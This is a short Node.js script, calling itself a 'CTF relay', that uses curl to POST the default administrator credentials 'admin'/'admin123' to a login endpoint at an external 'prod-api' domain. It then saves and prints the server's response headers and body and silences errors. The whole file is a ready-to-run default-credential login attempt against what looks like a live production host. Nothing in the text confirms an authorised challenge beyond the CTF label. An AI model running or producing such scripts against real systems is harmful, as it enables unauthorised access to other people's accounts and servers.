const { execFileSync } = require('child_process')
const target = 'https://yycty.lwsqueued.xyz/prod-api/login'
const body = JSON.stringify({username:'admin',password:'admin123',code:'',uuid:'',googleAuth:''})
console.log('CTF relay target:', target)
try {
  const out = execFileSync('curl', ['-k','-sS','-D','/tmp/relay_headers','-o','/tmp/relay_body','-X','POST',target,'-H','Content-Type: application/json','--data',body], {stdio:'pipe',encoding:'utf8'})
  console.log('--- curl stdout ---')
  console.log(out)
  console.log('--- relay headers ---')
  console.log(require('fs').readFileSync('/tmp/relay_headers','utf8'))
  console.log('--- relay body ---')
  console.log(require('fs').readFileSync('/tmp/relay_body','utf8'))
} catch (error) {
  console.log('CTF relay error:', error.message)
  if (error.stdout) console.log(error.stdout)
  if (error.stderr) console.log(error.stderr)
  process.exitCode = 0
}
